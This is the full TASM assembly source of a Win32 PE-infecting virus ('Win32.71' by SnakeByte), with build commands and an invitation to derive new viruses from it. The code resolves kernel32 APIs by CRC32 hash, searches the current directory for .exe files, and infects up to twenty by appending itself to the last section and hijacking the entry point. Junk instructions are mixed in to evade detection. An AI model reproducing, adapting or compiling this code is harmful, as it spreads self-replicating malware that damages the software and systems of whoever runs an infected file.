              
;
;
; Win32.71 by SnakeByte
;
; This Virus is created with the Next Generation VCK by SnakeByte
; to get a copy of this Virus Construction Kit check www.kryptocrew.de/snakebyte/
;
; Virus Description : 
;
;  Virusname              : Win32.71
;  Author                 : SnakeByte
;  Operating System       : Win32 ( Win9x, NT, ME, 2000 )
;  Target Files           : Windows Portable Executable
;  Created with           : Next Generation VCK 0.45
;  Creation Date          : 3/14/2016
;  Infection Mark         : 71
;  Infection Type         : increasing last section
;  API Search             : CRC32
;  Entry Point Obscurity  : No
;  Locate Kernel by       : using address from stack
;  Anti Bait              : No
;  Travelling             : No
;  Encrypt Hostcode       : No
;  Per-Process Residency  : No
;  SelfMailing            : No
;  mIRC Spreading         : No
;  Trash Ratio            : 1 to 37
;  No. of Files to infect : 20
;
;
;
; Compile this source code with (TASM 5.0) : 
;
;     tasm32 /z /ml /m2 <FileName>,,;
;     tlink32 -Tpe -c <FileName>,<FileName>,, import32.lib
;
; If you edit this source or create another virus from this,
; then please send me a copy so that I know what else I could add
;    Hope you enjoy this ... SnakeByte [ SnakeByte@kryptocrew.de ]
;

.586p
.model flat
jumps
.radix 16

 extrn ExitProcess:PROC

.data
 VirusSize equ (offset EndVirus - offset Virus )
 NumberOfApis equ 10d

VirusCode:
Virus:
 call Delta                             ; Get Delta Offset

Delta:
 pop edx
 sub edx, offset Delta
                                        ; mov ebp, edx
 mov ebp, edx
 jmp KernelSearchStart


;          [ ///// * Execute Original File * \\\\\ ]

NoKernel:
                                        ; store old EIP and ImageBase
 mov edi, dword ptr [ebp+OldEIP]

 mov dword ptr [ebp+retEIP], edi

 mov ecx, dword ptr [ebp+OldBase]

 mov dword ptr [ebp+retBase], ecx



ExecuteHost:                            ; Start the infected File

                                        ; check if we are first generation
 or ebp, ebp
 jz FirstGenHost
 mov ecx,12345678h
 org $-4
 retBase dd 0h
 add ecx,12345678h
 org $-4
 retEIP dd 0h
 jmp ecx



;           [ ///// * Outbreak Procedure * \\\\\ ]


Outbreak:                               ; Lets infect some files...


;   [ ///// * Infect Current Directory Procedure * \\\\\ ]

InfectCurDir:                           ; Infect the current directory
 lea ebx, [ebp+filemask]

                                        ; Set Infection Counter
                                        ; mov ecx, 20
 mov ecx, 0
 add ecx, 20d
 push ecx
 pop dword ptr [ebp+InfCounter]
                                        ; Find File to infect
 call FindFirstFileProc
 inc eax
 jz EndInfectCurDir

InfectCurDirFile:                       ; Infect the file
 call InfectFile
                                        ; Check Infection Counter
 mov edx, dword ptr [ebp+InfCounter]
 or edx, edx
 jz EndInfectCurDir
                                        ; find more Files
 call FindNextFileProc
 or eax, eax
 jnz InfectCurDirFile

EndInfectCurDir:
                                        ; Close the Handle
 mov esi, dword ptr [ebp+FindHandle]
 push esi
 call dword ptr [ebp+XFindClose]

 jmp ExecuteHost


;       [ ///// * Create the CRC32 of an API * \\\\\ ]

CRC32:
 pushad
                                        ; mov edx, edi
 mov edx, edi
LenCRC:
                                        ; add edx, 1
 inc edx
 cmp byte ptr [edx], 0
 jne LenCRC
 sub edx, edi
                                        ; mov esi, edx
                                        ; clear esi
 push 0
 pop esi
 add esi, edx
                                        ; add esi, 1
 inc esi
 cld
                                        ; clear ecx
 xor ecx, ecx
 add ecx, -1
                                        ; mov ebx, ecx
                                        ; clear ebx
 xor ebx, ebx
 add ebx, ecx
NextByteCRC:
                                        ; clear edx
 mov edx, 0
                                        ; clear eax
 push 0
 pop eax
 mov dl, byte ptr [edi]
                                        ; add edi, 1
 inc edi
 xor dl, cl
 mov cl, ch
 mov ch, bl
 mov bl, bh
 mov bh, 8
NextBitCRC:
 shr ax, 1
 rcr dx, 1
jnc NoCRC
 xor dx,08320h
 xor ax,0EDB8h
NoCRC:
 dec bh
jnz NextBitCRC
 xor ecx, edx
 xor ebx, eax
 dec esi
jnz NextByteCRC
 not ebx
 not ecx
 mov edx, ebx
 rol edx, 16d
 mov dx, cx
 mov dword ptr [ebp+APICRC32], edx
 popad
ret



;          [ ///// * APISearch - Procedure * \\\\\ ]


GetApis:                                ; Retrive the APIs we need


                                        ; number of API's we're looking for
 push NumberOfApis
 pop ecx

                                        ; load API Names and Offsets
 lea edi, [ebp+APIOffsets]
 xchg edi, esi

 lea edi, [ebp+APINames]
 xchg eax, edi


GetApisLoop: 
                                        ; clear the counter
 mov word ptr [ebp+counter], 0h

                                        ; search 'em
                                        ; eax points to the CRC
                                        ; esi points to the offset

 call SearchAPI1
                                        ; add eax, 4
 inc eax
 add eax, 3d
                                        ; mov ebx, -1
 mov ebx, ( -1d + 16d )
 sub ebx, 16d
 and ebx, dword ptr [ebp+TempAPI]
 mov dword ptr [esi], ebx
                                        ; add esi, 4
 dec esi
 add esi, 5d
 sub ecx, 1
 jnz GetApisLoop
 jmp Outbreak



;      [ ///// * Prepare Infection Procedure * \\\\\ ]

InfectFile:                             ; Infect a file
                                        ; check for minimum filesize
 lea esi, [ebp+WFD_nFileSizeLow]
 xchg ebx, esi

 cmp dword ptr [ebx], 20000d
 jbe NoInfection
                                        ; get and remove file attributes
 mov ebx, ebp
 add ebx, offset WFD_szFileName

 push ebx
 call dword ptr [ebp+XGetFileAttributesA]
 mov dword ptr [ebp+Attributes], eax
 push 80h
 mov eax, ebp
 inc ecx                                ; Trash
 add eax, offset WFD_szFileName
 inc edx                                ; Trash


 push eax
 call dword ptr [ebp+XSetFileAttributesA]
                                        ; add eax, 1
 add eax, 1d
 sub eax, 1
 jz NoInfection
 call OpenFile                          ; open the file
 jc NoInfection
                                        ; check for EXE File
 mov edx, dword ptr [ebp+MapAddress]
                                        ; check for ZM
 cmp word ptr [edx], 'ZM'
 je Goodfile
 jmp Notagoodfile

Goodfile:
 cmp word ptr [edx+3Ch], 0h
 je Notagoodfile
                                        ; clear eax
 xor eax, eax
 add eax, dword ptr [edx+3Ch]
                                        ; check if header lies inside the file
 cmp eax, dword ptr [ebp+WFD_nFileSizeLow]
 ja Notagoodfile
 add eax, edx
                                        ; check for PE Header
                                        ; check for EP
 movzx ecx, word ptr [eax]
 cmp ecx, 'EP'
 je Goodfile2
 jmp Notagoodfile

Goodfile2:
                                        ; check for previous Infection
 cmp dword ptr [eax+4Ch], '71'
 jz Notagoodfile
                                        ; check for OBJ
 mov bx, word ptr [eax+16h]
 and bx, 00002h
 cmp bx, 00002h
 jne Notagoodfile
                                        ; check for DLL
 mov bx, word ptr [eax+16h]
 and bx, 0F000h
 xor dword ptr [ebp+Trash1], ecx        ; Trash
 cmp bx, 02000h
 je Notagoodfile
 call InfectEXE                         ; Infect the file
 jnc Notagoodfile
                                        ; restore the file attributes
 mov ecx, dword ptr [ebp+Attributes]
 push ecx
 mov ecx, offset WFD_szFileName
 add ecx, ebp

 push ecx
 call dword ptr [ebp+XSetFileAttributesA]
 jmp NoInfection

Notagoodfile:
 call UnMapFile

NoInfection:
ret




;            [ ///// * Align Procedure * \\\\\ ]

Align:                                  ; align File or Section Size
 pushad
 mov ecx, dword ptr [ebp+AlignReg2]
                                        ; clear edx
 push 0
 pop edx
 mov eax, dword ptr [ebp+AlignReg1]
 mov dword ptr [ebp+AlignTemp], eax
 div ecx
 sub ecx, edx
 mov eax, dword ptr [ebp+AlignTemp]
 add eax, ecx
 mov dword ptr [ebp+AlignReg1], eax
 popad
ret


;          [ ///// * APISearch 1 Procedure * \\\\\ ]

                                        ; eax Points to API-CRC ( Virus )

SearchAPI1:                             ; Procedure to retrieve API Offsets
 pushad



 mov edi, dword ptr [ebp+KernelPE]
                                        ; get Export-Table
 mov ebx, [edi+78h]
 add ebx, [ebp+KernelMZ]
                                        ; add ebx, 28
 inc ebx
 add ebx, 27d
                                        ; get ATableVA
 mov edi, dword ptr [ebx]
 add edi, [ebp+KernelMZ]
 sbb edx, 19d                           ; Trash
                                        ; add ebx, 4
 inc ebx
 add ebx, 3d
 mov dword ptr [ebp+ATableVA], edi
                                        ; get NTableVA
 mov edi, dword ptr [ebx]
 add edi, [ebp+KernelMZ]
                                        ; add ebx, 4
 add ebx, 4d
 mov dword ptr [ebp+NTableVA], edi
                                        ; get OTableVA
 mov edi, dword ptr [ebx]
 add edi, [ebp+KernelMZ]
 mov dword ptr [ebp+OTableVA], edi
 mov ebx, dword ptr [ebp+NTableVA]


SearchNextApi1:                         ; search for the API's
 push ebx
 inc edx                                ; Trash
 mov ecx, dword ptr [ebp+KernelMZ]
 add ecx, dword ptr [ebx]
                                        ; mov ebx, ecx
                                        ; clear ebx
 push 0
 pop ebx
 add ebx, ecx
                                        ; mov edi, ecx
                                        ; clear edi
 mov edi, 17183d
 sub edi, 17183d
 add edi, ecx
 mov dword ptr [ebp+TempApisearch2], 0
 xor dword ptr [ebp+TempApisearch2], edi
 shl ecx, 1d                            ; Trash
 push eax
 cld

                                        ; edi Points to API-Name ( Kernel )
                                        ; eax Points to API-Name CRC ( Virus )
                                        ; compare Names
                                        ; CRC32 Api Search
 call CRC32
 push dword ptr [ebp+APICRC32]
 pop ecx
 sub ecx, dword ptr [eax]
 or ecx, ecx
 jz FoundApi1

ApiNotFound:                            ; we did not find it :(
 pop eax
 pop ebx
 mov edi, dword ptr [ebp+TempApisearch2]
                                        ; add ebx, 4
 dec ebx
 add ebx, 5d
 add word ptr [ebp+counter], 1h
 cmp word ptr [ebp+counter], 2000h
 je NotFoundApi1
 jmp SearchNextApi1

FoundApi1:                              ; we found the API
                                        ; clear Stack
 add esp, 8d
                                        ; retrieve the offset
 movzx edx, word ptr [ebp+counter]
                                        ; point to ordinal Table
 sal edx, 1                             ; multiply with 2
 add edx, dword ptr [ebp+OTableVA]
 xchg edx, ebx
 movzx edx, word ptr [ebx]
 sal edx, 2h
 add edx, dword ptr [ebp+ATableVA]
 add dword ptr [ebp+Trash1], edx        ; Trash
                                        ; convert to RVA
 mov ebx, dword ptr [edx]
 add ebx, dword ptr [ebp+KernelMZ]
 mov dword ptr [ebp+TempAPI], ebx
 popad
ret

NotFoundApi1:
                                        ; we did not get one of the nessecairy API's
                                        ; so we quit !
 pop esi
 popad
 jmp ExecuteHost



;      [ ///// * EXE FILE Infection Procedure * \\\\\ ]

InfectEXE:                              ; infect an exe file
 mov ebx, dword ptr [ebp+MapAddress]
                                        ; retrieve PE - Header
 mov ecx, ebx
 add ecx, [ebx+3Ch]
                                        ; get File Alignment
                                        ; add ecx, 60
 inc ecx
 add ecx, 59d
 mov eax, [ecx]
 add ecx, -60d
 mov edx, dword ptr [ebp+WFD_nFileSizeLow]
                                        ; calculate new size
 mov dword ptr [ebp+AlignReg2], eax
 add edx, VirusSize
 mov dword ptr [ebp+AlignReg1], edx
 call Align
 mov edx, dword ptr [ebp+AlignReg1]
                                        ; unmap file and map it again with new size
 mov dword ptr [ebp+NewSize], edx
 pushad
 Call UnMapFile2
 popad
 mov dword ptr [ebp+WFD_nFileSizeLow], edx
 call CreateMap
 jc NoEXE
 push dword ptr [ebp+MapAddress]
 pop esi
                                        ; retrieve PE - Header again
 mov ecx, esi
 add ecx, dword ptr [esi+3Ch]
                                        ; infect by increasing the last section
                                        ; clear esi
 mov esi, 0
 add esi, ecx
                                        ; get last section
 movzx edx, word ptr [esi+06h]
 inc dword ptr [ebp+Trash1]             ; Trash
 add edx, -1
 imul edx, edx, 28h
                                        ; add ecx, 120
 dec ecx
 add ecx, 121d
 add dword ptr [ebp+Trash1], 1320745    ; Trash
 add ecx, edx
                                        ; clear ebx
 push 0
 pop ebx
 add ebx, dword ptr [esi+74h]
 shl ebx, 3
 add ecx, ebx
                                        ; get old Entrypoint
 mov edx, dword ptr [esi+28h]
 mov dword ptr [ebp+OldEIP], 0
 xor dword ptr [ebp+OldEIP], edx
 mov ebx, dword ptr [esi+34h]
 mov dword ptr [ebp+OldBase], ebx
 mov edx, [ecx+10h]
                                        ; mov ebx, edx
 mov ebx, edx
 add edx, [ecx+14h]
 push edx
 push ebx
 pop eax
 add eax, [ecx+0Ch]
 mov dword ptr [ebp+NewEIP], eax
                                        ; save new enty point in file
 mov dword ptr [esi+28h], 0
 add dword ptr [esi+28h], eax
 mov eax, [ecx+10h]
 push eax
                                        ; calculate new section size
 push dword ptr [esi+3Ch]
 add eax, VirusSize
 pop dword ptr [ebp+AlignReg2]
 mov dword ptr [ebp+AlignReg1], eax
 call Align
                                        ; mov eax, -1
 mov eax, ( -1d + 22d )
 sub eax, 22d
 and eax, dword ptr [ebp+AlignReg1]
 mov dword ptr [ecx+10h], 0h
 add dword ptr [ecx+10h], eax
 pop eax
 add eax,  (VirusSize-1652d)
 add eax, 1652d
 mov dword ptr [ecx+08h], 0
 add dword ptr [ecx+08h], eax
 mov eax, dword ptr [ecx+0Ch]
 add eax, dword ptr [ecx+10h]
 mov dword ptr [esi+50h], eax
                                        ; set write, read and code flag
 or dword ptr [ecx+24h], 0A0000020h
                                        ; set infection mark
 mov dword ptr [esi+4Ch], '71'
                                        ; Append Virus
 pop edi
 add edi, dword ptr [ebp+MapAddress]
 mov ebx, VirusSize
 mov esi, ebp
 add esi, offset Virus


AppendLoop:
 movsb
 dec ebx
 jnz AppendLoop
                                        ; decrease Infection Counter
                                        ; clear eax
 push 0
 pop eax
 xor eax, dword ptr [ebp+InfCounter]
 sub eax, 1
 mov dword ptr [ebp+InfCounter], eax
 clc
ret

NoEXE:
 stc
ret



;        [ ///// * File Handling Procedure * \\\\\ ]

                                        ; File Handling
OpenFile:                               ; Open File
                                        ; clear ecx
 xor ecx, ecx

 push ecx
 push ecx
 push 3h
 push ecx
                                        ; add ecx, 1
 sub ecx, -1d
 push ecx
 push 80000000h or 40000000h
 mov ecx, ebp
 add ecx, offset WFD_szFileName

 push ecx
 call dword ptr [ebp+XCreateFileA]

 inc eax
 jz Closed
 sub eax, 1

 mov dword ptr [ebp+FileHandle], eax

CreateMap:                              ; Map the file
                                        ; clear edx
 xor edx, edx
 add edx, dword ptr [ebp+WFD_nFileSizeLow]
 add ebx, eax                           ; Trash
 push edx

                                        ; clear ebx
 mov ebx, -28912d
 add ebx, 28912d
 push ebx
 push edx
 push ebx
 push 00000004h
 push ebx
 push dword ptr [ebp+FileHandle]
 call dword ptr [ebp+XCreateFileMappingA]
 mov dword ptr [ebp+MapHandle], eax
 pop edx
 cmp eax, 0
 je CloseFile
 push edx
 push 0
 push 0
 push 2h
 push dword ptr [ebp+MapHandle]
 call dword ptr [ebp+XMapViewOfFile]
 test eax, eax
 jz UnMapFile
 mov dword ptr [ebp+MapAddress], eax
 clc
ret

UnMapFile:                              ; Unmap the file and store it to disk
 Call UnMapFile2

CloseFile:                              ; Close the file
 push dword ptr [ebp+FileHandle]
 Call [ebp+XCloseHandle]

Closed:
 stc
ret

UnMapFile2:
 push dword ptr [ebp+MapAddress]
 call dword ptr [ebp+XUnmapViewOfFile]
 push dword ptr [ebp+MapHandle]
 call dword ptr [ebp+XCloseHandle]
ret



;        [ ///// * Search Kernel Procedure * \\\\\ ]

KernelSearchStart:
                                        ; get Kernel Adress from Stack
                                        ; --> return Adress to the CreateProcess API
 pop ebx
                                        ; mov edx, 4
 mov edx, 0
 add edx, 4d
 sub esp, edx
                                        ; store old EIP and ImageBase
                                        ; clear ecx
 and ecx, 0
 add ecx, dword ptr [ebp+OldEIP]

 mov dword ptr [ebp+retEIP], ecx

 push dword ptr [ebp+OldBase]
 pop eax

 mov dword ptr [ebp+retBase], eax


                                        ; round to pages
 mov bx, 0h
                                        ; set maximum search count
 mov dword ptr [ebp+K32Trys], 4h

GK1:                                    ; check for DOS-EXE Stub
                                        ; mov eax, -1
 push -1d
 pop eax
 and eax, dword ptr [ebp+K32Trys]
 cmp eax, 0h
 jnz GotKernelXX
 jmp NoKernel
GotKernelXX:
                                        ; check for ZM
 cmp word ptr [ebx], 'ZM'
 je CheckPE

GK2:
 dec ebx
 sub ebx, 65535d
 mov edx, dword ptr [ebp+K32Trys]
 dec edx
 mov dword ptr [ebp+K32Trys], 0
 add dword ptr [ebp+K32Trys], edx
 jmp GK1

CheckPE:                                ; Check if found file is a win32 exe
                                        ; add ebx, 60
 add ebx, 60d
 mov ecx, [ebx]
 dec ebx
 sub ebx, 59d
 xchg ecx, ebx
 add ebx, ecx
 xchg ecx, ebx
                                        ; check for EP
 cmp word ptr [ecx], 'EP'
 je CheckDLL
 jmp GK2

CheckDLL:
                                        ; check if the file is a DLL
                                        ; add ecx, 22
 inc ecx
 add ecx, 21d
 adc dword ptr [ebp+Trash1], 1012184    ; Trash
                                        ; clear eax
 xor eax, eax
 movzx eax, word ptr [ecx]
 and ax, 0F000h
 cmp ax, 02000h
 jne GK2
GotDLL:                                 ; we found a DLL file
 inc dword ptr [ebp+Trash1]             ; Trash
 dec ecx
 sub ecx, 21d


KernelFound:
 push ecx
 pop dword ptr [ebp+KernelPE]
 mov dword ptr [ebp+KernelMZ], ebx

 lea eax, GetApis
 add eax, ebp

 push eax
ret


;          [ ///// * FindFiles Procedure * \\\\\ ]


ClearOldData:                           ; we don't want waste in the fields
 pushad
                                        ; mov eax, 276
 mov eax, ( 276d xor 6d )
 xor eax, 6d
 mov esi, offset WFD_szFileName
 add esi, ebp


ClearOldData2:
 mov byte ptr [esi], 0h
                                        ; add esi, 1
 sub esi, -1d
 dec eax
 jnz ClearOldData2
 popad
ret


FindNextFileProc:                       ; find another file
 call ClearOldData
 mov eax, ebp
 add eax, offset WIN32_FIND_DATA

 push eax
 mov edx, dword ptr [ebp+FindHandle]
 push edx
 call dword ptr [ebp+XFindNextFileA]
ret

                                        ; Find the first file
FindFirstFileProc:
 call ClearOldData
 lea edx, [ebp+WIN32_FIND_DATA]
 xchg edx, edi

 push edi
 push ebx
 call dword ptr [ebp+XFindFirstFileA]
 mov dword ptr [ebp+FindHandle], eax
ret





;                  [ ///// * Data * \\\\\ ]

Data:
 OldBase     dd 400000h
 NTableVA    dd 0h
 counter     dw 0h
 NewSize     dd 0h
 APICRC32    dd 0h
 InfCounter  dd 0h
 TempAPI     dd 0h
 Trash1      dd 0h
 FILETIME                STRUC
 FT_dwLowDateTime        dd       ?
 FT_dwHighDateTime       dd       ?
 FILETIME ENDS

 WIN32_FIND_DATA         label    byte
 WFD_dwFileAttributes    dd       ?
 WFD_ftCreationTime      FILETIME ?
 WFD_ftLastAccessTime    FILETIME ?
 WFD_ftLastWriteTime     FILETIME ?
 WFD_nFileSizeHigh       dd       ?
 WFD_nFileSizeLow        dd       ?
 WFD_dwReserved0         dd       ?
 WFD_dwReserved1         dd       ?
 WFD_szFileName          db       260d dup (?)
 WFD_szAlternateFileName db       13   dup (?)
 WFD_szAlternateEnding   db       03   dup (?)

 AlignReg2   dd 0h
 FindHandle  dd 0h
 KernelPE    dd 0h
 K32Trys     dd 0h
 MapHandle   dd 0h
 AlignTemp   dd 0h
 OTableVA    dd 0h

 APINames:
 dd 068624A9Dh           ; CloseHandle
 dd 094524B42h           ; UnmapViewOfFile
 dd 0C633D3DEh           ; GetFileAttributesA
 dd 0797B49ECh           ; MapViewOfFile
 dd 08C892DDFh           ; CreateFileA
 dd 096B2D96Ch           ; CreateFileMappingA
 dd 03C19E536h           ; SetFileAttributesA
 dd 0AA700106h           ; FindNextFileA
 dd 0AE17EBEFh           ; FindFirstFileA
 dd 0C200BE21h           ; FindClose


 APIOffsets:
 XCloseHandle           dd 0h
 XUnmapViewOfFile       dd 0h
 XGetFileAttributesA    dd 0h
 XMapViewOfFile         dd 0h
 XCreateFileA           dd 0h
 XCreateFileMappingA    dd 0h
 XSetFileAttributesA    dd 0h
 XFindNextFileA         dd 0h
 XFindFirstFileA        dd 0h
 XFindClose             dd 0h

 OldEIP      dd 0h
 MapAddress  dd 0h
 ATableVA    dd 0h
 KernelMZ    dd 0h
 FileHandle  dd 0h
 TempApisearch2 dd 0h
 AlignReg1   dd 0h
 db 'Win32.71 of SnakeByte',0
 Attributes  dd 0h
 filemask    db '*.ExE',0
 NewEIP      dd 0h




CryptEnd:
EndVirus:

;          [ //////////////////\\\\\\\\\\\\\\\\\\\ ]
;          [ ///// * First Generation Host * \\\\\ ]


.code                                   ; Lets place some code
                                        ; to start the virus
                                        ; which is inside the
                                        ; data section
FakeCode:

 push offset VirusCode

 ret


FirstGenHost:                           ; exit for the first generation
                                        ; clear eax
 mov eax, 0
 push eax
 call ExitProcess



end FakeCode

